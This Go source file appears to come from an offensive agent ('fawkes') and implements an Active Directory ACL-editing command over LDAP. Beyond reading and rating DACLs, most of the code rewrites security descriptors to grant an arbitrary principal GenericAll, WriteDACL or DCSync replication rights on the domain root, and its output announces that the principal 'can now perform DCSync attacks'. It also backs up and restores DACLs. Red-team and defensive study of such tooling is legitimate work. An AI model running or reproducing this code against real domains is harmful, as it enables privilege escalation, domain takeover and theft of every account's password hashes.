package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
)

// aclEditRead reads and displays the DACL of an AD object
func aclEditRead(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target '%s': %v", args.Target, err)
	}

	sd, err := aclEditReadSD(conn, targetDN)
	if err != nil {
		return errorf("Error reading security descriptor: %v", err)
	}

	aces := daclParseSD(sd)
	sidCache := daclResolveSIDs(conn, aces, baseDN)

	// Parse owner
	ownerSID := ""
	ownerOff := int(binary.LittleEndian.Uint32(sd[4:8]))
	if ownerOff > 0 && ownerOff+8 <= len(sd) {
		ownerSID = adcsParseSID(sd[ownerOff:])
	}
	ownerName := sidCache[ownerSID]
	if ownerName == "" {
		ownerName = ownerSID
	}

	type aceOutput struct {
		Principal   string `json:"principal"`
		SID         string `json:"sid"`
		Type        string `json:"type"`
		Permissions string `json:"permissions"`
		Risk        string `json:"risk"`
	}
	type readOutput struct {
		Mode     string      `json:"mode"`
		Target   string      `json:"target"`
		Owner    string      `json:"owner"`
		ACECount int         `json:"ace_count"`
		ACEs     []aceOutput `json:"aces"`
	}

	out := readOutput{
		Mode:     "acl-edit-read",
		Target:   targetDN,
		Owner:    ownerName,
		ACECount: len(aces),
	}

	for _, ace := range aces {
		principal := sidCache[ace.sid]
		if principal == "" {
			principal = ace.sid
		}
		aceTypeName := "ACCESS_ALLOWED"
		if ace.aceType == 0x05 {
			aceTypeName = "ACCESS_ALLOWED_OBJECT"
		}
		out.ACEs = append(out.ACEs, aceOutput{
			Principal:   principal,
			SID:         ace.sid,
			Type:        aceTypeName,
			Permissions: daclDescribePermissions(ace.mask, ace.aceType, ace.objectGUID),
			Risk:        daclAssessRisk(ace.mask, ace.aceType, ace.sid, ace.objectGUID),
		})
	}

	data, _ := json.Marshal(out)
	return successResult(string(data))
}

// aclEditModifySD reads the current SD, adds/removes an ACE, and writes the full modified SD back.
// Uses the complete original SD to preserve owner, group, and SACL — only the DACL is modified.
func aclEditModifySD(conn *ldap.Conn, targetDN string, principalSID []byte, principalSIDStr string, mask uint32, objectGUID []byte, aceType byte, remove bool) error {
	sd, err := aclEditReadSD(conn, targetDN)
	if err != nil {
		return fmt.Errorf("reading security descriptor for %s: %w", targetDN, err)
	}

	// Parse DACL offset and existing ACL
	daclOffset := int(binary.LittleEndian.Uint32(sd[16:20]))
	if daclOffset == 0 || daclOffset >= len(sd) {
		return fmt.Errorf("no DACL present in security descriptor")
	}

	if daclOffset+8 > len(sd) {
		return fmt.Errorf("invalid DACL offset")
	}

	aclSize := int(binary.LittleEndian.Uint16(sd[daclOffset+2 : daclOffset+4]))
	aceCount := int(binary.LittleEndian.Uint16(sd[daclOffset+4 : daclOffset+6]))

	// Extract existing ACEs
	existingACEs := make([]byte, aclSize-8)
	if daclOffset+8+len(existingACEs) <= len(sd) {
		copy(existingACEs, sd[daclOffset+8:daclOffset+aclSize])
	}

	newACE := buildACE(aceType, mask, principalSID, objectGUID)

	var newACLBody []byte
	var newACECount int

	if remove {
		newACLBody, newACECount = removeMatchingACEs(existingACEs, aceCount, principalSIDStr, mask, objectGUID, aceType)
		if newACECount == aceCount {
			return fmt.Errorf("no matching ACE found to remove for SID %s with mask 0x%08x", principalSIDStr, mask)
		}
	} else {
		//nolint:gocritic // intentional: prepend newACE before existingACEs
		newACLBody = append(newACE, existingACEs...)
		newACECount = aceCount + 1
	}

	// Build new ACL
	newACLSize := 8 + len(newACLBody)
	newACL := make([]byte, newACLSize)
	newACL[0] = sd[daclOffset] // Preserve original ACL revision
	newACL[1] = 0
	binary.LittleEndian.PutUint16(newACL[2:4], uint16(newACLSize))
	binary.LittleEndian.PutUint16(newACL[4:6], uint16(newACECount))
	binary.LittleEndian.PutUint16(newACL[6:8], 0)
	copy(newACL[8:], newACLBody)

	// Rebuild the full SD: preserve everything before the DACL, replace DACL, preserve everything after
	// The SD is self-relative, so we need to adjust offsets if the DACL size changed
	oldACLEnd := daclOffset + aclSize
	sizeDelta := newACLSize - aclSize

	newSD := make([]byte, len(sd)+sizeDelta)
	// Copy everything before the DACL
	copy(newSD[:daclOffset], sd[:daclOffset])
	// Insert new DACL
	copy(newSD[daclOffset:], newACL)
	// Copy everything after the old DACL
	if oldACLEnd < len(sd) {
		copy(newSD[daclOffset+newACLSize:], sd[oldACLEnd:])
	}

	// Adjust offsets in the SD header for sections that come after the DACL
	ownerOff := int(binary.LittleEndian.Uint32(newSD[4:8]))
	groupOff := int(binary.LittleEndian.Uint32(newSD[8:12]))
	saclOff := int(binary.LittleEndian.Uint32(newSD[12:16]))

	if ownerOff > daclOffset {
		binary.LittleEndian.PutUint32(newSD[4:8], uint32(ownerOff+sizeDelta))
	}
	if groupOff > daclOffset {
		binary.LittleEndian.PutUint32(newSD[8:12], uint32(groupOff+sizeDelta))
	}
	if saclOff > daclOffset {
		binary.LittleEndian.PutUint32(newSD[12:16], uint32(saclOff+sizeDelta))
	}

	// Write the modified SD back, trying with SD_FLAGS control first for DACL-only modification,
	// falling back to writing the full SD without the control
	sdFlagsControl := buildSDFlagsControl(0x04) // DACL_SECURITY_INFORMATION

	// Try with SD_FLAGS control — tells AD to only modify the DACL
	modReq := ldap.NewModifyRequest(targetDN, []ldap.Control{sdFlagsControl})
	// When using SD_FLAGS, write a minimal SD with just the DACL
	minSD := make([]byte, 20+len(newACL))
	minSD[0] = 1                                      // Revision
	binary.LittleEndian.PutUint16(minSD[2:4], 0x8004) // SE_DACL_PRESENT | SE_SELF_RELATIVE
	binary.LittleEndian.PutUint32(minSD[16:20], 20)   // OffsetDacl
	copy(minSD[20:], newACL)
	modReq.Replace("nTSecurityDescriptor", []string{string(minSD)})

	err = conn.Modify(modReq)
	if err != nil {
		// Fallback: write the full modified SD without the control
		modReq = ldap.NewModifyRequest(targetDN, nil)
		modReq.Replace("nTSecurityDescriptor", []string{string(newSD)})
		err = conn.Modify(modReq)
	}

	if err != nil {
		return fmt.Errorf("writing modified security descriptor for %s: %w", targetDN, err)
	}
	return nil
}

// aclEditAdd adds an ACE granting the specified right to the principal
func aclEditAdd(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" {
		return errorResult("Error: principal parameter required (sAMAccountName or SID)")
	}
	if args.Right == "" {
		return errorResult("Error: right parameter required (genericall, writedacl, writeowner, forcechangepassword, dcsync, etc.)")
	}

	mask, objectGUID, aceType := rightToMaskAndGUID(args.Right)
	if mask == 0 {
		return errorf("Unknown right: %s\nAvailable: genericall, genericwrite, writedacl, writeowner, allextendedrights, writeproperty, forcechangepassword, dcsync, ds-replication-get-changes-all, write-member, write-spn, write-keycredentiallink", args.Right)
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target '%s': %v", args.Target, err)
	}

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return errorf("Error resolving principal '%s': %v", args.Principal, err)
	}

	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, mask, objectGUID, aceType, false); err != nil {
		return errorf("Error modifying DACL: %v", err)
	}

	rightDesc := args.Right
	if aceType == 0x05 && len(objectGUID) == 16 {
		rightDesc = fmt.Sprintf("%s (%s)", args.Right, daclGUIDName(objectGUID))
	}

	return successf("[*] ACL Modified\n"+
		"[+] Target: %s\n"+
		"[+] Principal: %s (%s)\n"+
		"[+] Right Added: %s\n"+
		"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, rightDesc, args.Server)
}

// aclEditRemove removes a matching ACE from the DACL
func aclEditRemove(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" || args.Right == "" {
		return errorResult("Error: principal and right parameters required")
	}

	mask, objectGUID, aceType := rightToMaskAndGUID(args.Right)
	if mask == 0 {
		return errorf("Unknown right: %s", args.Right)
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target '%s': %v", args.Target, err)
	}

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return errorf("Error resolving principal '%s': %v", args.Principal, err)
	}

	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, mask, objectGUID, aceType, true); err != nil {
		return errorf("Error modifying DACL: %v", err)
	}

	return successf("[*] ACL Modified\n"+
		"[+] Target: %s\n"+
		"[+] Principal: %s (%s)\n"+
		"[+] Right Removed: %s\n"+
		"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Right, args.Server)
}

// aclEditGrantDCSync adds both DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
func aclEditGrantDCSync(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" {
		return errorResult("Error: principal parameter required")
	}

	// DCSync needs to be applied to the domain root, not an arbitrary object
	targetDN := baseDN

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return errorf("Error resolving principal '%s': %v", args.Principal, err)
	}

	// Add DS-Replication-Get-Changes
	guid1 := aclGUIDBytes("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x00000100, guid1, 0x05, false); err != nil {
		return errorf("Error adding DS-Replication-Get-Changes: %v", err)
	}

	// Add DS-Replication-Get-Changes-All
	guid2 := aclGUIDBytes("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x00000100, guid2, 0x05, false); err != nil {
		return errorf("Error adding DS-Replication-Get-Changes-All: %v", err)
	}

	return successf("[*] DCSync Rights Granted\n"+
		"[+] Target: %s (domain root)\n"+
		"[+] Principal: %s (%s)\n"+
		"[+] Added: DS-Replication-Get-Changes\n"+
		"[+] Added: DS-Replication-Get-Changes-All\n"+
		"[+] Server: %s\n"+
		"[!] The principal can now perform DCSync attacks\n", targetDN, args.Principal, principalSIDStr, args.Server)
}

// aclEditGrantGenericAll adds GenericAll to the principal on the target
func aclEditGrantGenericAll(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" {
		return errorResult("Error: principal parameter required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target '%s': %v", args.Target, err)
	}

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return errorf("Error resolving principal '%s': %v", args.Principal, err)
	}

	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x10000000, nil, 0x00, false); err != nil {
		return errorf("Error adding GenericAll: %v", err)
	}

	return successf("[*] GenericAll Granted\n"+
		"[+] Target: %s\n"+
		"[+] Principal: %s (%s)\n"+
		"[+] Right: GenericAll (FULL CONTROL)\n"+
		"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Server)
}

// aclEditGrantWriteDACL adds WriteDACL to the principal on the target
func aclEditGrantWriteDACL(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" {
		return errorResult("Error: principal parameter required")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target '%s': %v", args.Target, err)
	}

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return errorf("Error resolving principal '%s': %v", args.Principal, err)
	}

	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x00040000, nil, 0x00, false); err != nil {
		return errorf("Error adding WriteDACL: %v", err)
	}

	return successf("[*] WriteDACL Granted\n"+
		"[+] Target: %s\n"+
		"[+] Principal: %s (%s)\n"+
		"[+] Right: WriteDACL\n"+
		"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Server)
}

// aclEditBackup exports the current DACL as base64 for later restoration
func aclEditBackup(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target '%s': %v", args.Target, err)
	}

	sd, err := aclEditReadSD(conn, targetDN)
	if err != nil {
		return errorf("Error reading security descriptor: %v", err)
	}

	encoded := base64.StdEncoding.EncodeToString(sd)

	type backupOutput struct {
		Mode   string `json:"mode"`
		Target string `json:"target"`
		Backup string `json:"backup"`
	}

	out := backupOutput{
		Mode:   "acl-edit-backup",
		Target: targetDN,
		Backup: encoded,
	}

	data, _ := json.Marshal(out)
	return successResult(string(data))
}

// aclEditRestore writes a previously backed-up DACL back to the object
func aclEditRestore(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Backup == "" {
		return errorResult("Error: backup parameter required (base64-encoded security descriptor from backup action)")
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return errorf("Error resolving target '%s': %v", args.Target, err)
	}

	sd, err := base64.StdEncoding.DecodeString(args.Backup)
	if err != nil {
		return errorf("Error decoding backup: %v", err)
	}

	if len(sd) < 20 {
		return errorResult("Error: invalid security descriptor (too short)")
	}

	// Try with SD_FLAGS control first, fallback to without
	sdFlagsControl := buildSDFlagsControl(0x04)
	modReq := ldap.NewModifyRequest(targetDN, []ldap.Control{sdFlagsControl})
	modReq.Replace("nTSecurityDescriptor", []string{string(sd)})

	err = conn.Modify(modReq)
	if err != nil {
		modReq = ldap.NewModifyRequest(targetDN, nil)
		modReq.Replace("nTSecurityDescriptor", []string{string(sd)})
		err = conn.Modify(modReq)
	}

	if err != nil {
		return errorf("Error restoring DACL: %v", err)
	}

	return successf("[*] DACL Restored\n"+
		"[+] Target: %s\n"+
		"[+] Restored from backup (%d bytes)\n"+
		"[+] Server: %s\n", targetDN, len(sd), args.Server)
}
